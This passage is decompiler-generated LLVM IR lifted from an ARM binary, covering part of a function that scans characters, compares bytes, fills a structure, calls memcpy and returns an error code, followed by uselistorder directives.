  %v1_10ed0 = phi i32 [ %v0_10ea8, %dec_label_pc_10c94 ], [ %v1_10ea8, %dec_label_pc_10ea8 ]
  %v2_10eb8 = sub i32 %v1_10ed0, ptrtoint ([9 x i8]* @global_var_1a0c8.651 to i32)
  store i32 %v2_10eb8, i32* %r3.global-to-local, align 4
  %v8_10ec0 = icmp sgt i32 %v2_10eb8, 1
  br i1 %v8_10ec0, label %.thread25, label %dec_label_pc_10ec4

dec_label_pc_10ec4:                               ; preds = %dec_label_pc_10eb4
  %v1_10ec4 = inttoptr i32 %v1_10ed4 to i8*
  %v2_10ec4 = load i8, i8* %v1_10ec4, align 1
  %v3_10ec4 = zext i8 %v2_10ec4 to i32
  store i32 %v3_10ec4, i32* %r2.global-to-local, align 4
  %v1_10ec8 = inttoptr i32 %v1_10ed0 to i8*
  %v2_10ec8 = load i8, i8* %v1_10ec8, align 1
  %v3_10ec8 = zext i8 %v2_10ec8 to i32
  store i32 %v3_10ec8, i32* %r3.global-to-local, align 4
  %v9_10ecc = icmp eq i8 %v2_10ec4, %v2_10ec8
  br i1 %v9_10ecc, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_10ec4
  %v2_10ed0 = add i32 %v1_10ed0, 9
  store i32 %v2_10ed0, i32* %r1.global-to-local, align 4
  %v2_10ed4 = add i32 %v1_10ed4, 1
  store i32 %v2_10ed4, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_10ec4, %dec_label_pc_10eb4, %bb135
  %v0_10edc = phi i32 [ %v1_10ed0, %dec_label_pc_10ec4 ], [ %v1_10ed0, %dec_label_pc_10eb4 ], [ %v2_10ed0, %bb135 ]
  %v0_10ed8 = phi i32 [ %v1_10ed4, %dec_label_pc_10ec4 ], [ %v1_10ed4, %dec_label_pc_10eb4 ], [ %v2_10ed4, %bb135 ]
  %v1_10ed8 = inttoptr i32 %v0_10ed8 to i8*
  %v2_10ed8 = load i8, i8* %v1_10ed8, align 1
  %v3_10ed8 = zext i8 %v2_10ed8 to i32
  store i32 %v3_10ed8, i32* %r2.global-to-local, align 4
  %v1_10edc = add i32 %v0_10edc, 9
  %v2_10edc = inttoptr i32 %v1_10edc to i8*
  %v3_10edc = load i8, i8* %v2_10edc, align 1
  %v4_10edc = zext i8 %v3_10edc to i32
  store i32 %v4_10edc, i32* %r3.global-to-local, align 4
  %v2_10ee0 = icmp eq i8 %v2_10ed8, 0
  %v3_10ee4 = mul nuw nsw i32 %v4_10edc, 256
  store i32 %v3_10ee4, i32* @lr, align 4
  br i1 %v2_10ee0, label %dec_label_pc_110e4, label %dec_label_pc_10eec

dec_label_pc_10eec:                               ; preds = %.thread25
  %v3_10ef0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_10ef0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10ef4

dec_label_pc_10ef4:                               ; preds = %dec_label_pc_10f78, %dec_label_pc_10eec
  %v1_10f04 = phi i32 [ %v1_10f78, %dec_label_pc_10f78 ], [ ptrtoint ([21 x i8]* @global_var_1a108.653 to i32), %dec_label_pc_10eec ]
  %v1_10ef4 = inttoptr i32 %v1_10f04 to i8*
  %v2_10ef4 = load i8, i8* %v1_10ef4, align 1
  %v3_10ef4 = zext i8 %v2_10ef4 to i32
  store i32 %v3_10ef4, i32* %r3.global-to-local, align 4
  %v9_10ef8 = icmp eq i8 %v2_10ef4, %v2_10ed8
  br i1 %v9_10ef8, label %dec_label_pc_10f00, label %dec_label_pc_10f78

dec_label_pc_10f00:                               ; preds = %dec_label_pc_10ef4
  store i32 ptrtoint ([21 x i8]* @global_var_1a108.653 to i32), i32* %r3.global-to-local, align 4
  %v2_10f04 = sub i32 %v1_10f04, ptrtoint ([21 x i8]* @global_var_1a108.653 to i32)
  store i32 %v2_10f04, i32* %r2.global-to-local, align 4
  %v7_10f0c = icmp slt i32 %v2_10f04, 18
  br i1 %v7_10f0c, label %bb137, label %dec_label_pc_10f10

dec_label_pc_10f10:                               ; preds = %dec_label_pc_10f00
  %v1_10f10 = and i32 %v3_10ee4, 1024
  %v2_10f10 = icmp eq i32 %v1_10f10, 0
  br i1 %v2_10f10, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_10f10
  %v2_10f14 = add i32 %v2_10f04, -2
  store i32 %v2_10f14, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_10f00, %dec_label_pc_10f10, %bb136
  %v0_10f18 = phi i32 [ %v2_10f04, %dec_label_pc_10f00 ], [ %v2_10f04, %dec_label_pc_10f10 ], [ %v2_10f14, %bb136 ]
  %v1_10f18 = load i32, i32* %r7.global-to-local, align 4
  %v2_10f18 = add i32 %v1_10f18, 32
  %v3_10f18 = inttoptr i32 %v2_10f18 to i32*
  store i32 %v0_10f18, i32* %v3_10f18, align 4
  store i32 ptrtoint (i32* @global_var_1a0fb.655 to i32), i32* %r1.global-to-local, align 4
  %v0_10f24.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10f20

dec_label_pc_10f20:                               ; preds = %dec_label_pc_10f20, %bb137
  %v0_10f20 = phi i32 [ %v1_10f20, %dec_label_pc_10f20 ], [ ptrtoint (i32* @global_var_1a0fb.655 to i32), %bb137 ]
  %v1_10f20 = add i32 %v0_10f20, 1
  %v2_10f20 = inttoptr i32 %v1_10f20 to i8*
  %v3_10f20 = load i8, i8* %v2_10f20, align 1
  %v4_10f20 = zext i8 %v3_10f20 to i32
  store i32 %v4_10f20, i32* %r3.global-to-local, align 4
  store i32 %v1_10f20, i32* %r1.global-to-local, align 4
  %v8_10f28 = icmp sgt i32 %v0_10f24.pre, %v4_10f20
  br i1 %v8_10f28, label %dec_label_pc_10f20, label %dec_label_pc_10f2c

dec_label_pc_10f2c:                               ; preds = %dec_label_pc_10f20
  store i32 ptrtoint (i32* @global_var_1a0ec.659 to i32), i32* %r0.global-to-local, align 4
  %v2_10f34 = sub i32 %v1_10f20, ptrtoint (i32* @global_var_1a0fc.657 to i32)
  %v2_10f38 = mul i32 %v2_10f34, 2
  store i32 %v2_10f38, i32* %r3.global-to-local, align 4
  %v2_10f40 = add i32 %v2_10f38, ptrtoint (i32* @global_var_1a0ec.659 to i32)
  store i32 %v2_10f40, i32* %r2.global-to-local, align 4
  %v1_10f44 = add i32 %v2_10f38, add (i32 ptrtoint (i32* @global_var_1a0ec.659 to i32), i32 1)
  %v2_10f44 = inttoptr i32 %v1_10f44 to i8*
  %v3_10f44 = load i8, i8* %v2_10f44, align 1
  %v4_10f44 = zext i8 %v3_10f44 to i32
  store i32 %v4_10f44, i32* %r1.global-to-local, align 4
  %v2_10f48 = add i32 %v2_10f38, ptrtoint (i32* @global_var_1a0dc.661 to i32)
  store i32 %v2_10f48, i32* %r2.global-to-local, align 4
  %v3_10f4c = inttoptr i32 %v2_10f40 to i8*
  %v4_10f4c = load i8, i8* %v3_10f4c, align 2
  %v6_10f4c = zext i8 %v4_10f4c to i32
  store i32 %v6_10f4c, i32* %r0.global-to-local, align 4
  %v1_10f50 = add i32 %v2_10f38, add (i32 ptrtoint (i32* @global_var_1a0dc.661 to i32), i32 1)
  %v2_10f50 = inttoptr i32 %v1_10f50 to i8*
  %v3_10f50 = load i8, i8* %v2_10f50, align 1
  %v4_10f50 = zext i8 %v3_10f50 to i32
  store i32 %v4_10f50, i32* %r2.global-to-local, align 4
  %v3_10f54 = inttoptr i32 %v2_10f48 to i8*
  %v4_10f54 = load i8, i8* %v3_10f54, align 2
  %v6_10f54 = zext i8 %v4_10f54 to i32
  %v3_10f58 = mul nuw i32 %v4_10f44, 16777216
  store i32 %v3_10f58, i32* %r1.global-to-local, align 4
  %v4_10f5c = sdiv i32 %v3_10f58, 65536
  %v5_10f5c = or i32 %v6_10f4c, %v4_10f5c
  %v3_10f60 = mul nuw i32 %v4_10f50, 16777216
  store i32 %v3_10f60, i32* %r2.global-to-local, align 4
  %v4_10f64 = sdiv i32 %v3_10f60, 65536
  %v5_10f64 = or i32 %v6_10f54, %v4_10f64
  store i32 %v5_10f64, i32* %r3.global-to-local, align 4
  %v0_10f68 = load i32, i32* @lr, align 4
  %v2_10f68 = or i32 %v5_10f5c, %v0_10f68
  store i32 ptrtoint ([21 x i8]* @global_var_1a108.653 to i32), i32* @ip, align 4
  %v2_10f70 = and i32 %v2_10f68, %v5_10f64
  store i32 %v2_10f70, i32* %r0.global-to-local, align 4
  %v0_10f8c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10f84

dec_label_pc_10f78:                               ; preds = %dec_label_pc_10ef4
  %v1_10f78 = add i32 %v1_10f04, 1
  %v2_10f78 = inttoptr i32 %v1_10f78 to i8*
  %v3_10f78 = load i8, i8* %v2_10f78, align 1
  %v4_10f78 = zext i8 %v3_10f78 to i32
  store i32 %v4_10f78, i32* %r3.global-to-local, align 4
  store i32 %v1_10f78, i32* @ip, align 4
  %v2_10f7c = icmp eq i8 %v3_10f78, 0
  br i1 %v2_10f7c, label %dec_label_pc_10f84, label %dec_label_pc_10ef4

dec_label_pc_10f84:                               ; preds = %dec_label_pc_10f78, %dec_label_pc_10f2c
  %v0_10f90 = phi i32 [ %v0_10f68, %dec_label_pc_10f2c ], [ %v3_10ee4, %dec_label_pc_10f78 ]
  %v0_10f8c = phi i32 [ %v0_10f8c.pre, %dec_label_pc_10f2c ], [ %v0_10ed8, %dec_label_pc_10f78 ]
  %v0_10f84 = phi i32 [ %v2_10f70, %dec_label_pc_10f2c ], [ %v3_10ef0, %dec_label_pc_10f78 ]
  store i32 %v0_10f84, i32* %stack_var_-36, align 4
  %v0_10f88 = load i32, i32* @r4, align 4
  %v1_10f88 = and i32 %v0_10f88, 4
  %v1_10f8c = inttoptr i32 %v0_10f8c to i8*
  %v2_10f8c = load i8, i8* %v1_10f8c, align 1
  %v3_10f8c = zext i8 %v2_10f8c to i32
  store i32 %v3_10f8c, i32* %r1.global-to-local, align 4
  %v1_10f90 = and i32 %v0_10f90, 3840
  %v1_10f94 = and i32 %v0_10f88, -5
  %v2_10f98 = or i32 %v1_10f94, %v1_10f90
  store i32 %v2_10f98, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_10f88, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_10fa8 = load i32, i32* %r7.global-to-local, align 4
  %v2_10fa8 = add i32 %v1_10fa8, 12
  %v3_10fa8 = inttoptr i32 %v2_10fa8 to i32*
  store i32 %v3_10f8c, i32* %v3_10fa8, align 4
  %v0_10fac = load i32, i32* %r7.global-to-local, align 4
  %v1_10fac = add i32 %v0_10fac, 4
  %v2_10fac = inttoptr i32 %v1_10fac to i32*
  %v3_10fac = load i32, i32* @r5, align 4
  store i32 %v3_10fac, i32* %v2_10fac, align 4
  %v4_10fac = add i32 %v0_10fac, 8
  %v5_10fac = inttoptr i32 %v4_10fac to i32*
  %v6_10fac = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_10fac, i32* %v5_10fac, align 4
  %v0_10fb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_10fb0 = load i32, i32* %r7.global-to-local, align 4
  %v2_10fb0 = add i32 %v1_10fb0, 20
  %v3_10fb0 = inttoptr i32 %v2_10fb0 to i32*
  store i32 %v0_10fb0, i32* %v3_10fb0, align 4
  %v0_10fb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_10fb4 = load i32, i32* %r7.global-to-local, align 4
  %v2_10fb4 = add i32 %v1_10fb4, 16
  %v3_10fb4 = inttoptr i32 %v2_10fb4 to i32*
  store i32 %v0_10fb4, i32* %v3_10fb4, align 4
  %v0_10fb8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10fb8 = load i32, i32* %r7.global-to-local, align 4
  %v2_10fb8 = add i32 %v1_10fb8, 28
  %v3_10fb8 = inttoptr i32 %v2_10fb8 to i32*
  store i32 %v0_10fb8, i32* %v3_10fb8, align 4
  %v0_10fbc = load i32, i32* @ip, align 4
  %v1_10fbc = inttoptr i32 %v0_10fbc to i8*
  %v2_10fbc = load i8, i8* %v1_10fbc, align 1
  %v3_10fbc = zext i8 %v2_10fbc to i32
  store i32 %v3_10fbc, i32* %r2.global-to-local, align 4
  %v2_10fc0 = icmp eq i8 %v2_10fbc, 0
  br i1 %v2_10fc0, label %dec_label_pc_10fc8, label %dec_label_pc_10fe0

dec_label_pc_10fc8:                               ; preds = %dec_label_pc_10f84
  %v0_10fc8 = load i32, i32* %r6.global-to-local, align 4
  %v1_10fc8 = inttoptr i32 %v0_10fc8 to i8*
  %v2_10fc8 = load i8, i8* %v1_10fc8, align 1
  %v3_10fc8 = zext i8 %v2_10fc8 to i32
  store i32 %v3_10fc8, i32* %r3.global-to-local, align 4
  %v7_10fcc = icmp eq i8 %v2_10fc8, 109
  br i1 %v7_10fcc, label %dec_label_pc_10fd4, label %dec_label_pc_110e4

dec_label_pc_10fd4:                               ; preds = %dec_label_pc_10fc8
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_10fd8 = load i32, i32* %r7.global-to-local, align 4
  %v2_10fd8 = add i32 %v1_10fd8, 32
  %v3_10fd8 = inttoptr i32 %v2_10fd8 to i32*
  store i32 20, i32* %v3_10fd8, align 4
  %v0_10fdc = load i32, i32* %r2.global-to-local, align 4
  %v1_10fdc = load i32, i32* %r7.global-to-local, align 4
  %v2_10fdc = add i32 %v1_10fdc, 28
  %v3_10fdc = inttoptr i32 %v2_10fdc to i32*
  store i32 %v0_10fdc, i32* %v3_10fdc, align 4
  br label %dec_label_pc_10fe0

dec_label_pc_10fe0:                               ; preds = %dec_label_pc_10f84, %dec_label_pc_10fd4
  %v0_10fe0 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_10fe0, 1
  br i1 %tmp141, label %dec_label_pc_11098, label %dec_label_pc_10fe8

dec_label_pc_10fe8:                               ; preds = %dec_label_pc_10fe0
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10fec

dec_label_pc_10fec:                               ; preds = %dec_label_pc_11080, %dec_label_pc_10fe8
  %v8_11008 = phi i32 [ 0, %dec_label_pc_10fe8 ], [ %v1_11084, %dec_label_pc_11080 ]
  %v7_10ff0 = icmp sgt i32 %v8_11008, 2
  br i1 %v7_10ff0, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_10fec
  store i32 %v25_10c50, i32* %r2.global-to-local, align 4
  %v12_10ff4 = mul i32 %v8_11008, 4
  %v13_10ff4 = add i32 %v12_10ff4, %v25_10c50
  store i32 %v13_10ff4, i32* %r3.global-to-local, align 4
  %v9_10ff8 = add i32 %v13_10ff4, -24
  %v10_10ff8 = inttoptr i32 %v9_10ff8 to i32*
  %v11_10ff8 = load i32, i32* %v10_10ff8, align 4
  store i32 %v11_10ff8, i32* %r2.global-to-local, align 4
  %v9_10ffc = load i32, i32* %r7.global-to-local, align 4
  %v10_10ffc = add i32 %v9_10ffc, %v8_11008
  store i32 %v10_10ffc, i32* %r3.global-to-local, align 4
  %v9_11004 = trunc i32 %v11_10ff8 to i8
  %v11_11004 = add i32 %v10_10ffc, 36
  %v12_11004 = inttoptr i32 %v11_11004 to i8*
  store i8 %v9_11004, i8* %v12_11004, align 1
  %v8_1100c = load i32, i32* %r3.global-to-local, align 4
  %v9_1100c = add i32 %v8_1100c, 36
  %v10_1100c = inttoptr i32 %v9_1100c to i8*
  %v11_1100c = load i8, i8* %v10_1100c, align 1
  %v12_1100c = zext i8 %v11_1100c to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_10fec
  %v10_11008 = add i32 %v8_11008, %stack_var_-48.3
  store i32 %v10_11008, i32* %r3.global-to-local, align 4
  %v9_11010 = add i32 %v10_11008, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_11034 = phi i32 [ %v12_1100c, %bb142 ], [ %v9_11010, %bb143 ]
  store i32 %v0_11034, i32* @r2, align 4
  %v1_11014 = load i32, i32* %sb.global-to-local, align 4
  %v2_11014 = sub i32 %v0_11034, %v1_11014
  %v4_11014 = xor i32 %v1_11014, %v0_11034
  %v5_11014 = xor i32 %v2_11014, %v0_11034
  %v6_11014 = and i32 %v5_11014, %v4_11014
  %v7_11014 = icmp slt i32 %v6_11014, 0
  %v8_11014 = icmp slt i32 %v2_11014, 0
  %v9_11014 = icmp eq i32 %v0_11034, %v1_11014
  %v3_11018 = xor i1 %v8_11014, %v7_11014
  %v4_11018 = or i1 %v9_11014, %v3_11018
  br i1 %v4_11018, label %dec_label_pc_11028, label %dec_label_pc_1101c

dec_label_pc_1101c:                               ; preds = %bb144
  %v1_1101c = add i32 %v0_11034, -9
  %v3_1101c = sub i32 8, %v0_11034
  %v4_1101c = and i32 %v3_1101c, %v0_11034
  %v5_1101c = icmp slt i32 %v4_1101c, 0
  %v6_1101c = icmp slt i32 %v1_1101c, 0
  %v7_1101c = icmp eq i32 %v0_11034, 9
  %v3_11020 = xor i1 %v6_1101c, %v5_1101c
  %v4_11020 = or i1 %v7_1101c, %v3_11020
  br i1 %v4_11020, label %dec_label_pc_11024, label %dec_label_pc_110e4

dec_label_pc_11024:                               ; preds = %dec_label_pc_1101c
  store i32 %v0_11034, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11028

dec_label_pc_11028:                               ; preds = %bb144, %dec_label_pc_11024
  store i32 %v25_10c50, i32* @ip, align 4
  %v1_1102c = load i32, i32* %r8.global-to-local, align 4
  %v4_1102c = mul i32 %v1_1102c, 4
  %v5_1102c = add i32 %v4_1102c, %v25_10c50
  store i32 %v5_1102c, i32* %r3.global-to-local, align 4
  %v1_11030 = add i32 %v5_1102c, -12
  %v2_11030 = inttoptr i32 %v1_11030 to i32*
  %v3_11030 = load i32, i32* %v2_11030, align 4
  store i32 %v3_11030, i32* %r5.global-to-local, align 4
  %v1_11034 = add i32 %v0_11034, -1
  store i32 %v1_11034, i32* %sl.global-to-local, align 4
  %v0_11038 = load i32, i32* %r7.global-to-local, align 4
  %v4_11038 = mul i32 %v1_11034, 4
  %v5_11038 = add i32 %v0_11038, %v4_11038
  store i32 %v5_11038, i32* %r3.global-to-local, align 4
  %v7_1103c = icmp eq i32 %v3_11030, 8
  %v1_11040 = add i32 %v5_11038, 40
  %v2_11040 = inttoptr i32 %v1_11040 to i32*
  %v3_11040 = load i32, i32* %v2_11040, align 4
  store i32 %v3_11040, i32* @r0, align 4
  br i1 %v7_1103c, label %dec_label_pc_11080, label %dec_label_pc_11048

dec_label_pc_11048:                               ; preds = %dec_label_pc_11028
  %v9_11048 = icmp eq i32 %v3_11040, %v3_11030
  br i1 %v9_11048, label %dec_label_pc_1106c, label %bb145

bb145:                                            ; preds = %dec_label_pc_11048
  %v8_1104c = icmp eq i32 %v3_11040, 8
  br i1 %v8_1104c, label %dec_label_pc_1106c, label %dec_label_pc_11054

dec_label_pc_11054:                               ; preds = %bb145
  %v0_11054 = call i32 @_promoted_size()
  %v0_1105c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1105c, i32* @r0, align 4
  %v0_11060 = call i32 @_promoted_size()
  store i32 %v0_11060, i32* %r0.global-to-local, align 4
  %v8_11068 = icmp sgt i32 %v0_11054, %v0_11060
  br i1 %v8_11068, label %dec_label_pc_11080, label %dec_label_pc_11054.dec_label_pc_1106c_crit_edge

dec_label_pc_11054.dec_label_pc_1106c_crit_edge:  ; preds = %dec_label_pc_11054
  %v1_11070.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_11078.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_11078.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1106c

dec_label_pc_1106c:                               ; preds = %dec_label_pc_11054.dec_label_pc_1106c_crit_edge, %dec_label_pc_11048, %bb145
  %v1_11078 = phi i32 [ %v1_11078.pre, %dec_label_pc_11054.dec_label_pc_1106c_crit_edge ], [ %v1_11034, %dec_label_pc_11048 ], [ %v1_11034, %bb145 ]
  %v0_11078 = phi i32 [ %v0_11078.pre, %dec_label_pc_11054.dec_label_pc_1106c_crit_edge ], [ %v0_11038, %dec_label_pc_11048 ], [ %v0_11038, %bb145 ]
  %v1_11070 = phi i32 [ %v1_11070.pre, %dec_label_pc_11054.dec_label_pc_1106c_crit_edge ], [ %v1_1102c, %dec_label_pc_11048 ], [ %v1_1102c, %bb145 ]
  store i32 %v25_10c50, i32* %r1.global-to-local, align 4
  %v4_11070 = mul i32 %v1_11070, 4
  %v5_11070 = add i32 %v4_11070, %v25_10c50
  store i32 %v5_11070, i32* %r3.global-to-local, align 4
  %v1_11074 = add i32 %v5_11070, -12
  %v2_11074 = inttoptr i32 %v1_11074 to i32*
  %v3_11074 = load i32, i32* %v2_11074, align 4
  store i32 %v3_11074, i32* @r2, align 4
  %v4_11078 = mul i32 %v1_11078, 4
  %v5_11078 = add i32 %v4_11078, %v0_11078
  store i32 %v5_11078, i32* %r3.global-to-local, align 4
  %v2_1107c = add i32 %v5_11078, 40
  %v3_1107c = inttoptr i32 %v2_1107c to i32*
  store i32 %v3_11074, i32* %v3_1107c, align 4
  br label %dec_label_pc_11080

dec_label_pc_11080:                               ; preds = %dec_label_pc_11054, %dec_label_pc_11028, %dec_label_pc_1106c
  %v0_11080 = load i32, i32* %r7.global-to-local, align 4
  %v1_11080 = add i32 %v0_11080, 28
  %v2_11080 = inttoptr i32 %v1_11080 to i32*
  %v3_11080 = load i32, i32* %v2_11080, align 4
  %v0_11084 = load i32, i32* %r8.global-to-local, align 4
  %v1_11084 = add i32 %v0_11084, 1
  store i32 %v1_11084, i32* %r8.global-to-local, align 4
  %v1_11088 = add i32 %v3_11080, 2
  store i32 %v1_11088, i32* %r3.global-to-local, align 4
  %v6_11090 = icmp slt i32 %v1_11084, %v1_11088
  br i1 %v6_11090, label %dec_label_pc_10fec, label %dec_label_pc_110b0

dec_label_pc_11098:                               ; preds = %dec_label_pc_10fe0
  %v0_11098 = load i32, i32* %r7.global-to-local, align 4
  %v1_11098 = add i32 %v0_11098, 28
  %v2_11098 = inttoptr i32 %v1_11098 to i32*
  %v3_11098 = load i32, i32* %v2_11098, align 4
  store i32 %v3_11098, i32* %r2.global-to-local, align 4
  %v0_1109c = load i32, i32* %r0.global-to-local, align 4
  %v1_1109c = trunc i32 %v0_1109c to i8
  %v3_1109c = add i32 %v0_11098, 38
  %v4_1109c = inttoptr i32 %v3_1109c to i8*
  store i8 %v1_1109c, i8* %v4_1109c, align 1
  %v0_110a0 = load i32, i32* %r2.global-to-local, align 4
  %v3_110a0 = mul i32 %v0_110a0, 4
  store i32 %v3_110a0, i32* @r2, align 4
  %v0_110a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_110a4 = add i32 %v0_110a4, 40
  store i32 %v1_110a4, i32* @r0, align 4
  %v2_110a8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_110a8, i32* @r1, align 4
  %v0_110ac = call i32 @memcpy()
  store i32 %v0_110ac, i32* %r0.global-to-local, align 4
  %v0_110b0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_110b0

dec_label_pc_110b0:                               ; preds = %dec_label_pc_11080, %dec_label_pc_11098
  %v2_110cc = phi i32 [ %v0_110b0.pre, %dec_label_pc_11098 ], [ %v0_11080, %dec_label_pc_11080 ]
  %v1_110b0 = add i32 %v2_110cc, 16
  %v2_110b0 = inttoptr i32 %v1_110b0 to i32*
  %v3_110b0 = load i32, i32* %v2_110b0, align 4
  store i32 %v3_110b0, i32* %r3.global-to-local, align 4
  %v1_110b4 = and i32 %v3_110b0, 128
  %v2_110b4 = icmp eq i32 %v1_110b4, 0
  br i1 %v2_110b4, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_110b0
  store i32 %v2_10c58, i32* %r3.global-to-local, align 4
  %v2_110bc = inttoptr i32 %v2_110cc to i32*
  %v3_110bc = load i32, i32* %v2_110bc, align 4
  %v2_110c4.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_110c4 = sub i32 %v2_110c4.pre, %v2_10c58
  store i32 %v3_110c4, i32* %r3.global-to-local, align 4
  %v5_110c8 = mul i32 %v3_110c4, 4
  %v6_110c8 = add i32 %v5_110c8, %v3_110bc
  store i32 %v6_110c8, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_110b0
  %v1_110c041 = load i32, i32* %r6.global-to-local, align 4
  %v2_110c042 = add i32 %v1_110c041, 1
  store i32 %v2_110c042, i32* %r3.global-to-local, align 4
  %v3_110cc = inttoptr i32 %v2_110cc to i32*
  store i32 %v2_110c042, i32* %v3_110cc, align 4
  %v0_110d0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_110d8 = phi i32 [ %v2_110cc, %.thread44 ], [ %v0_110d0.pre, %.thread46 ]
  %v1_110d0 = add i32 %v1_110d8, 28
  %v2_110d0 = inttoptr i32 %v1_110d0 to i32*
  %v3_110d0 = load i32, i32* %v2_110d0, align 4
  store i32 %v3_110d0, i32* %r3.global-to-local, align 4
  %v1_110d4 = add i32 %v3_110d0, 2
  store i32 %v1_110d4, i32* %r0.global-to-local, align 4
  %v0_110d8 = load i32, i32* %sb.global-to-local, align 4
  %v2_110d8 = add i32 %v1_110d8, 24
  %v3_110d8 = inttoptr i32 %v2_110d8 to i32*
  store i32 %v0_110d8, i32* %v3_110d8, align 4
  br i1 %v2_110b4, label %dec_label_pc_110e8, label %bb147

bb147:                                            ; preds = %bb146
  %v1_110dc = load i32, i32* @r2, align 4
  %v2_110dc = load i32, i32* %r7.global-to-local, align 4
  %v3_110dc = inttoptr i32 %v2_110dc to i32*
  store i32 %v1_110dc, i32* %v3_110dc, align 4
  br label %dec_label_pc_110e8

dec_label_pc_110e4:                               ; preds = %dec_label_pc_10ca0, %dec_label_pc_10dac, %dec_label_pc_10e5c, %dec_label_pc_10e30, %dec_label_pc_10e3c, %dec_label_pc_10d7c, %dec_label_pc_1101c, %dec_label_pc_10fc8, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_110e8

dec_label_pc_110e8:                               ; preds = %bb147, %bb146, %dec_label_pc_110e4
  %v2_110ec = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_110ec, i32* @r4, align 4
  store i32 %v6_10c50, i32* @r5, align 4
  %v26_110ec = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_110ec

; uselistorder directives
  uselistorder i32 %v3_110c4, { 1, 0 }
  uselistorder i32 %v1_11084, { 1, 2, 0 }
  uselistorder i32 %v0_11038, { 1, 2, 0 }
  uselistorder i32 %v2_11014, { 1, 0 }
  uselistorder i32 %v1_11014, { 1, 0, 2 }
  uselistorder i32 %v0_11034, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_10f78, { 1, 2, 0 }
  uselistorder i32 %v3_10f60, { 1, 0 }
  uselistorder i32 %v3_10f58, { 1, 0 }
  uselistorder i32 %v2_10f38, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10f20, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10f04, { 1, 0, 2 }
  uselistorder i32 %v3_10ee4, { 2, 1, 0 }
  uselistorder i32 %v1_10ea8, { 0, 2, 3, 1 }
  uselistorder i32 %v2_10e7c, { 1, 0 }
  uselistorder i32 %v5_10ddc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10ddc, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_10d88, { 1, 0 }
  uselistorder i32 %v0_10da4, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_10d6c, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_10d54, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_10d40, { 1, 2, 0 }
  uselistorder i32 %v0_10db8, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10cf4, { 1, 0 }
  uselistorder i32 %v1_10cc4, { 0, 2, 1 }
  uselistorder i32 %v25_10c50, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 3, 2, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 3, 1, 0, 4, 8, 5, 17, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 2, 18 }
  uselistorder i32* %r6.global-to-local, { 14, 8, 10, 13, 0, 2, 11, 3, 4, 5, 7, 12, 15, 6, 1, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 0, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 17, 16, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 39, 40, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
